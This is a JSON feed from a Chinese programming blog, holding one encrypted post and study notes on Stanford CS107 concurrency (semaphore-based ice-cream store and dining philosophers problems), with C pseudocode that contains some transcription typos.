{
    "version": "https://jsonfeed.org/version/1",
    "title": "亚纳奇的Blog",
    "description": "一个不知名的小菜鸡",
    "home_page_url": "http://Yanagi-Kon.github.io",
    "items": [
        {
            "id": "http://yanagi-kon.github.io/2023/12/20/%E7%BE%8E%E5%9B%BD%E8%87%AA%E7%94%B1%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF/",
            "url": "http://yanagi-kon.github.io/2023/12/20/%E7%BE%8E%E5%9B%BD%E8%87%AA%E7%94%B1%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF/",
            "title": "美国教育邮箱信息",
            "date_published": "2023-12-20T13:12:21.000Z",
            "content_html": "<div class=\"hbe hbe-container\" id=\"hexo-blog-encrypt\" data-wpm=\"Oh, this is an invalid password. Check and try again, please.\" data-whm=\"OOPS, these decrypted content may changed, but you can still have a look.\">\n  <script id=\"hbeData\" type=\"hbeData\" data-hmacdigest=\"9f7708bfdfe6a4495ab61531d8934259f097969f2548c29e6727b0879b73b4f0\">10d79030e8222445804370796b90fca1b3149e2c2a0f36d6b4ea04e548758c21315d8d8bac1b80dd6595ac84494c86bb38b58485f679a371abbb187fac9e76f6afa95cbdad5bcb7d7260b7286d884c67fe1faa682f9a5e81b73e1808e108f26b8c7f8057ae9d9e9f259d554b72e516a45a8fb282e089bfc452b1a3ac71a665003d7f40622c4fd72f6c8fd35718cdcf4573fb6745c583b7d782fd6fed6e2c0e6bcfb42404fc42f72c537ede4324cb3be2bebc1cd60e0e5bd81c586758d880c70d2ece8f34b97b21b399590408a5ace244d5ce6886af599a922be3f428b3ccdd6c47fbc09787c5787bbc4fa30c84ff3fd0eb5a88fad2b1a4d2119c3dc9966a16b157749727d06a45b7aec23593c296f271e8fce086c50f29cf761dd6b4831ba7c37d5a23d8a2222d9d0734d9ee327f95b455cd24ecd7d722bbf6b1e6b659b505b727c5b1f7261036133bd01c9dd000528384b49076e873d1a037ae4e96a170debc1e97b5574ce7545ccbab5055ecdf18ff80474f1ff0ded73d0058dd9d5a5043753b49c63ad5b9d01c0edac678061a1a0a8e2101f7b1bdb8af1acb135c5ea867a5a0f1b730a8b7436f53ec79c777abcb062cff433b6c14ca331f51e2f34bc11e0a26847649283ea9be447ac21dce83821eb989fce6257f80d05bb71b96c70e087267ddf5f4e6657f31273f4f1ff532e30a55540e7a5d356ab790629cd3ecfe80eddbb4d7fe935a11d1eda6f74eba683999a99a65cff4c015555b9a7b68141a766217e3a0f699efdcc71dcf73c832ad0c1ee66933b257d1e1ec47a93e854623764720c8024e1cdc0ad001059c07a87badd640fa983261fd1bbe5560b93ecd9085efcca72113bf75976ee9350336333d3721b2456ce68052957b3d36bb062d7499c0e0fe2974ec30dca40d986fb0a9fe1f43f107c6c31a31d45ad9861ebf45f3ccc2ea3a4f2140ec7f3afea2d24661c4f0e08da03929256612cb21fc5a178f80601f0e05dfe37f5ccf21654e83e2d4efeff6dc848c06ef370fef42d714b8382b09fece2339f021d1bc139f7884b21cbb765e24d39e136a982b39fb48102b2d8a4c8738c837623ef5f5a205136004d318ad2e7e246cb150101dcbe2800ad78c676ce7fb8eb4807e5243c3169bb50eccde215820c3dafb8efdc514ba201fab7f1f3465befdf527492516ec66a6d1d22f446b0557c4f0683d874de7f1970b053c187bc58255cd5a879bd313db4fba744ee24449fd50cd7e019aac5a7549b7928b48211175017231f671c3f76fd2e3cbe6486d33d7dc220e712c44760a0b0b05ff02dc4437e53cbc6b8af3a4e62b8545bb93a25d4ab68511c192efb1f74dbb9cbd39c300252c745c005bb39899ed227528f514be3bcbf65d051ff49da8c34bd463ee11d06f0763fbb8789f722a96cfaf70a49929337c1fad56f56c902c65042de2bb99baa8f89cb777df99146b48568a6a90625b73ed27a35405c991083600fbd29c071f</script>\n  <div class=\"hbe hbe-content\">\n    <div class=\"hbe hbe-input hbe-input-default\">\n      <input class=\"hbe hbe-input-field hbe-input-field-default\" type=\"password\" id=\"hbePass\">\n      <label class=\"hbe hbe-input-label hbe-input-label-default\" for=\"hbePass\">\n        <span class=\"hbe hbe-input-label-content hbe-input-label-content-default\">Hey, password is required here.</span>\n      </label>\n    </div>\n  </div>\n</div>\n<script data-pjax src=\"/lib/hbe.js\"></script><link href=\"/css/hbe.style.css\" rel=\"stylesheet\" type=\"text/css\">",
            "tags": [
                "test"
            ]
        },
        {
            "id": "http://yanagi-kon.github.io/2023/12/19/2023-12-19-%E6%96%AF%E5%9D%A6%E7%A6%8F%E7%BC%96%E7%A8%8B%E8%8C%83%E5%BC%8FCS107_18/",
            "url": "http://yanagi-kon.github.io/2023/12/19/2023-12-19-%E6%96%AF%E5%9D%A6%E7%A6%8F%E7%BC%96%E7%A8%8B%E8%8C%83%E5%BC%8FCS107_18/",
            "title": "斯坦福编程范式CS107_18",
            "date_published": "2023-12-19T11:03:00.000Z",
            "content_html": "<h1 id=\"斯坦福编程范式cs107_18\"><a class=\"markdownIt-Anchor\" href=\"#斯坦福编程范式cs107_18\">#</a> 斯坦福编程范式 CS107_18</h1>\n<h2 id=\"上节课提到的冰淇淋商店模拟问题\"><a class=\"markdownIt-Anchor\" href=\"#上节课提到的冰淇淋商店模拟问题\">#</a> 上节课提到的冰淇淋商店模拟问题</h2>\n<p>我们有一个收银员；十个顾客，会随机买 1 到 4 个冰淇淋；制作冰淇淋的店员，10 到 40 个，每个店员一次只做一个甜筒； 只有一个经理，店员需要将冰淇淋交给经理检查，并且一次只有一个店员进去检查。所以一共有四种线程，一共大概可能 52 个线程。 我们需要一些方式使他们之间能够相互通讯。</p>\n<p>显然的店员进办公室需要一把锁，因为一次只能有一个店员进办公室。经理一直都在办公室中等待，直到检查的冰淇淋数量达到一天的要求，所以经理是一个循环。当顾客拿到他们订的冰淇淋后，他们就排队去收银员那里，并且这个队列应该是 FIFO 形式的，先进先出。</p>\n<h3 id=\"main函数\"><a class=\"markdownIt-Anchor\" href=\"#main函数\">#</a> main 函数</h3>\n<p>main 函数主要是产生我们需要的所有线程，当然也不是所有线程都在 main 函数中生成，比如，顾客负责生成店员的线程，即，只有顾客要求了店员才会去生产冰淇淋。</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token punctuation\">,</span><span class=\"token operator\">-</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">int</span> totalCones <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\t<span class=\"token comment\">// 甜筒的数量</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token function\">InitThreadPackage</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\t<span class=\"token comment\">// 初始化线程</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token function\">SehpSemaphores</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\t\t<span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span><span class=\"token number\">10</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">int</span> numCones <span class=\"token operator\">=</span> <span class=\"token function\">RandomInteger</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token function\">ThreadNew</span><span class=\"token punctuation\">(</span>Name<span class=\"token punctuation\">,</span>Customer<span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>numCones<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 顾客线程</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        totolCones <span class=\"token operator\">+=</span> numCones<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token function\">ThreadNew</span><span class=\"token punctuation\">(</span>Name2<span class=\"token punctuation\">,</span>Cashier<span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\t<span class=\"token comment\">// 收银员线程</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token function\">ThreadNew</span><span class=\"token punctuation\">(</span>Name3<span class=\"token punctuation\">,</span>Manager<span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>totalCones<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 经理线程</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token function\">RunAllThreads</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 开启所有的线程</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token function\">SemaphoreFree</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"经理\"><a class=\"markdownIt-Anchor\" href=\"#经理\">#</a> 经理</h3>\n<p>下面从经理开始讲起，因为经理较为简单。我们需要知道，经理检查完甜筒后，甜筒是否合格，这就涉及到一些通讯方式。</p>\n<p>下面通过使用一个<strong>全局的结构体</strong>进行检查这一个动作。bool 类型的 passed 表示甜筒是否通过；信号量 requested 表示经理的锁初始化为 0，经理要等待有一个人进来，否则他就一直处于阻塞状态。信号量 finished 表示店员的冰淇淋是否检查完毕，如果检查完了就唤醒店员。</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">struct</span> <span class=\"token class-name\">inspection</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    bool passed<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    Semaphore <span class=\"token function\">requested</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    Semaphore <span class=\"token function\">finished</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>下面我们来完成经理函数， <code>numApproved</code>  是今天检查的甜筒总数， <code>numInspected</code>  是检查过的店员的数量。当检查的甜筒总数没有达到目标值时，就要一直等待店员提供冰淇淋进行检查，并且检查是否通过是一个随机的。如果通过检查了，就 <code>numApproved</code>  加 1，并且结束的时候通过信号量告知店员检查结束了。</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">Manager</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> totalConesNeeded<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">int</span> numApproved <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">int</span> numInspected <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span>numApproved<span class=\"token operator\">&lt;</span>totalNumNeeded<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token function\">SemaphoreWait</span><span class=\"token punctuation\">(</span>inspection<span class=\"token punctuation\">.</span>requested<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        numInspected<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        inspection<span class=\"token punctuation\">.</span>passed <span class=\"token operator\">=</span> <span class=\"token function\">RandomChance</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>inspection<span class=\"token punctuation\">.</span>passed<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            numApproved<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token function\">SemaphoreSignal</span><span class=\"token punctuation\">(</span>inspection<span class=\"token punctuation\">.</span>finished<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"店员\"><a class=\"markdownIt-Anchor\" href=\"#店员\">#</a> 店员</h3>\n<p>被顾客告知需要做甜筒后，店员需要做甜筒并且让经理来检查，一旦通过检查，就将甜筒交给顾客，否则就继续做甜筒。于是我们来更新一下我们存放信号量的结构体。添加一个信号量 lock 并初始化为 1，使得至少初始能有一个店员进入经理办公室。</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">struct</span> <span class=\"token class-name\">inspection</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    bool passed<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    Semaphore <span class=\"token function\">requested</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    Semaphore <span class=\"token function\">finished</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    Semaphore <span class=\"token function\">lock</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>店员在不通过的时候一直做甜筒，做完就等待进入办公室，并在进入办公室的时候唤醒经理，并等待经理检查完毕。取得是否通过的结果后，店员释放锁。并最终通知顾客甜筒好了。</p>\n<p>** 问题：** 为什么需要 requested 那个锁？因为如果不这样的话，经理就会对进来的人持续给出评价，并且你也不确定哪一个评价是你这个甜筒的。</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">Clerk</span><span class=\"token punctuation\">(</span>Semaphore semaToSignal<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    bool passed <span class=\"token operator\">=</span> flase<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>passed<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token function\">MakeCone</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token function\">SemaphoreWait</span><span class=\"token punctuation\">(</span>inspection<span class=\"token punctuation\">.</span>lock<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token function\">SenaphoreSignal</span><span class=\"token punctuation\">(</span>inspection<span class=\"token punctuation\">.</span>requested<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token function\">SemaphoreWait</span><span class=\"token punctuation\">(</span>inspection<span class=\"token punctuation\">.</span>finished<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        passed <span class=\"token operator\">=</span> inspection<span class=\"token punctuation\">.</span>passed<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token function\">SemaphoreSignal</span><span class=\"token punctuation\">(</span>inspection<span class=\"token punctuation\">.</span>lock<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token function\">SemaphoreSignal</span><span class=\"token punctuation\">(</span>semaToSignal<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"顾客\"><a class=\"markdownIt-Anchor\" href=\"#顾客\">#</a> 顾客</h3>\n<p>一开始顾客什么也不做，随后他需要找 n 个店员来做他这 n 个甜筒。信号量 <code>clerksDone</code>  是等待店员做好了甜筒通知你并把甜筒给你。接着是等待店员把所有的甜筒做完，并释放店员线程。之后进行排队。</p>\n<p>随后去去一个号码，并且不要和其他人同时去拿。再等待排到你的时候你会将收银员唤醒，并最终等待你的位置的账单被处理完。</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">Costomer</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> numCones<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token function\">BrowX</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    Semaphore <span class=\"token function\">clerksDone</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i <span class=\"token operator\">&lt;</span> numCones<span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token function\">ThreadNew</span><span class=\"token punctuation\">(</span>Name<span class=\"token punctuation\">,</span>Clerk<span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>clerksDone<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span>numCones<span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token function\">SemaphoreWait</span><span class=\"token punctuation\">(</span>clerksDone<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token function\">SemaphoreFree</span><span class=\"token punctuation\">(</span>clerksDone<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token function\">WalkToCashier</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token function\">SemaphoreWait</span><span class=\"token punctuation\">(</span>line<span class=\"token punctuation\">.</span>lock<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">int</span> place <span class=\"token operator\">=</span> line<span class=\"token punctuation\">.</span>number<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token function\">SemaphoreSignal</span><span class=\"token punctuation\">(</span>line<span class=\"token punctuation\">.</span>lock<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token function\">SemaphoreSignal</span><span class=\"token punctuation\">(</span>line<span class=\"token punctuation\">.</span>requested<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token function\">SemaphoreWait</span><span class=\"token punctuation\">(</span>line<span class=\"token punctuation\">.</span>customers<span class=\"token punctuation\">[</span>place<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"收银员\"><a class=\"markdownIt-Anchor\" href=\"#收银员\">#</a> 收银员</h3>\n<p>接下来看我们的其他结构体，这个结构体能够处理顾客和收银员之间的通讯的所有信号量。现在顾客必须去收银员那里，并必须排队等待轮到他的时候，所以他需要获得一个数字，也就是队列中的下一个可占用的位置。</p>\n<p>number 表示顾客当前所在队列的号，信号量 requested 表示收银员当前是否被需要，信号量 customers 是一个数组，当收银员处理完对应队列中某一个人的帐单后，就告知此人可以走了。并且由于 number 是共享资源，所以我们也需要对它加上一个锁。</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">struct</span> <span class=\"token class-name\">line</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">int</span> number<span class=\"token punctuation\">;</span>\t<span class=\"token comment\">//0</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    Semaphore requested<span class=\"token punctuation\">;</span> <span class=\"token comment\">//0</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    Semaphore customers<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    Semaphore lock<span class=\"token punctuation\">;</span> <span class=\"token comment\">//1</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>对于 10 个顾客，收银员需要知道自己是否被需要了，</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">Cashier</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">&lt;</span> <span class=\"token number\">10</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token function\">SemaphoreWait</span><span class=\"token punctuation\">(</span>line<span class=\"token punctuation\">.</span>requested<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token function\">Checkout</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token function\">SemaphoreSignal</span><span class=\"token punctuation\">(</span>line<span class=\"token punctuation\">.</span>customers<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure>",
            "tags": [
                "斯坦福编程范式CS107"
            ]
        },
        {
            "id": "http://yanagi-kon.github.io/2023/12/19/2023-12-01-%E6%96%AF%E5%9D%A6%E7%A6%8F%E7%BC%96%E7%A8%8B%E8%8C%83%E5%BC%8FCS107_17/",
            "url": "http://yanagi-kon.github.io/2023/12/19/2023-12-01-%E6%96%AF%E5%9D%A6%E7%A6%8F%E7%BC%96%E7%A8%8B%E8%8C%83%E5%BC%8FCS107_17/",
            "title": "斯坦福编程范式CS107_17",
            "date_published": "2023-12-19T07:27:00.000Z",
            "content_html": "<h1 id=\"斯坦福编程范式cs107_17\"><a class=\"markdownIt-Anchor\" href=\"#斯坦福编程范式cs107_17\">#</a> 斯坦福编程范式 CS107_17</h1>\n<h2 id=\"接着上节课的哲学家问题进餐问题\"><a class=\"markdownIt-Anchor\" href=\"#接着上节课的哲学家问题进餐问题\">#</a> 接着上节课的哲学家问题进餐问题</h2>\n<pre><code class=\"language-C\">Semaphore forks[] = &#123;1,1,1,1,1&#125;;\n\nvoid philosopher(int id)&#123;\n    for(int i =0;i&lt;3:i++)&#123;\n        Think();\n        SemaphoreWait(forks[id]);\n        SemaphoreWait(forks[(id+1)%5]);\n        Eat();\n        SemaphoreSignal(forks[id]);\n        SemaphoreSignal(forks[(id+1)%5]);\n    &#125;\n    Think();\n&#125;\n</code></pre>\n<p>上节课我们知道上述情况下，可能会出现死锁状态，所有人都在等待另一个人放下筷子以便自己进行吃饭动作。那么我们知道一共有 5 个叉子，并且 5/2=2，所以也就是说最多只能有两个哲学家在同一时刻进行进餐。所以最简单的方法就是再加一个信号量，并且信号量为 2。</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>Semaphore forks<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Semaphore  <span class=\"token function\">numAllowedToEat</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">philosopher</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> id<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span><span class=\"token number\">3</span><span class=\"token operator\">:</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token function\">Think</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token function\">SemaphoreWait</span><span class=\"token punctuation\">(</span>numAllowedToEat<span 